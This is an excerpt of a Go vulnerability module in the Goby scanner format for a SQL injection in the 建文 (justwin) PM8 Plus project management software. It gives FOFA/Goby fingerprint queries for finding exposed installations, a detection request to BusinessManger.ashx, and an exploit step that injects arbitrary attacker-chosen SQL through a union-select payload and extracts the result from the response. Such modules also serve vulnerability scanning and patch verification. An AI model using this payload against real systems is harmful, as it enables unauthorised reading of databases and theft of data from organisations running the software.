...
func init() {
	expJson := `{
    "Name": "justwin  Engineering Project Management Software BusinessManger.ashx SQL Injection",
    ...
    "Author": "1angx",
    "FofaQuery": "body=\"Login/QRLogin.ashx\"||title=\" 建文工程项目管理软件（PM8 Plus版）\"",
    "GobyQuery": "body=\"Login/QRLogin.ashx\"||title=\" 建文工程项目管理软件（PM8 Plus版）\"",
    "Level": "2",
    ...
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/AppInterface/Business/BusinessManger.ashx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "method=PrjType&content=%' and 1=2 union select 1,(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32));-- a"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
    ...
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                ...
                "data_type": "text",
                "data": "method=PrjType&content=%' and 1=2 union select 1,(select+{{{sql}}});-- a"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
            ...
            "SetVariable": [
                "output|lastbody|regex|CodeName\":\"(?s)(.*)\"}],\"MSG\""
            ]
        }
    ],
    "Tags": [
    ...
    "Translation": {
        "CN": {
            "Name": "建文工程项目管理软件 BusinessManger.ashx SQL 注入漏洞",
